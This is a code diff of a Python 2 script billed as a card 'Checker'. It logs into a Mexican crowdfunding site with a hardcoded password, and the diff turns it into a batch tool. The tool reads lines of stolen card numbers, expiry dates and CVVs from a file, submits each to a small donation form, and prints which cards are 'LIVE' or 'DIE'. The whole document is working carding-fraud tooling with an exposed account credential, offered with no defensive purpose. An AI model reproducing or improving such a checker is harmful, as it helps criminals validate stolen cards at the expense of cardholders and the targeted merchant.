@@ -7,11 +7,12 @@
 import mechanize
 import sys
 
-cc = sys.argv[1]
-ano = sys.argv[2]
-mes = sys.argv[3]
-cvv = sys.argv[4]
+#cc = sys.argv[1]
+#ano = sys.argv[2]
+#mes = sys.argv[3]
+#cvv = sys.argv[4]
 
+print "\n"
 print "                    	Checker Version Beta 0.2.5 \n";
 
 print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
@@ -33,26 +34,41 @@ br.form['user[password]'] = 'joshua75'
 
 br.submit()
 
-response = br.open('https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=5&continue=Continuar')
-urlchecker = 'https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=5&continue=Continuar'
-urlpass = br.geturl()
+contador = 0
 
-br.select_form(nr=2)
+lista = sys.argv[1]
+ccs = open(lista ,'r')
 
-br.form['date[year]'] = [ano]
-br.form['date[month]'] = [mes]
+try:
+	while contador <= 50:
 
-br.set_value('Zack Dasti', nr=3)
-br.set_value(cc, nr=2)
-br.set_value(cvv, nr=6)
+		cc, mes, ano, cvv = ccs.next().rstrip("\n").split("|")
 
-br.submit()
+		response = br.open('https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=5&continue=Continuar')
+		urlchecker = 'https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=5&continue=Continuar'
+		urlpass = br.geturl()
 
-if (urlpass != urlchecker):
-	print " Felicidadez tienes una cc live , \n paso correctamente los algoritmos :D "
+		br.select_form(nr=2)
 
-else :
-	print " Lo siento mucho pero tu cc no pasa \n por los algoritmos D:"
+		br.form['date[year]'] = [ano]
+		br.form['date[month]'] = [mes]
+
+		br.set_value('Zack Dasti', nr=3)
+		br.set_value(cc, nr=2)
+		br.set_value(cvv, nr=6)
+
+		br.submit()
+
+		if (urlpass != urlchecker):
+			print "	LIVE  " + cc + "\n"
+
+		else :
+			print "	DIE  " + cc + "\n"
+
+		contador = contador + 1
+
+except:
+	print "	El Checker Ha Terminado :) "
 
 exit()
 
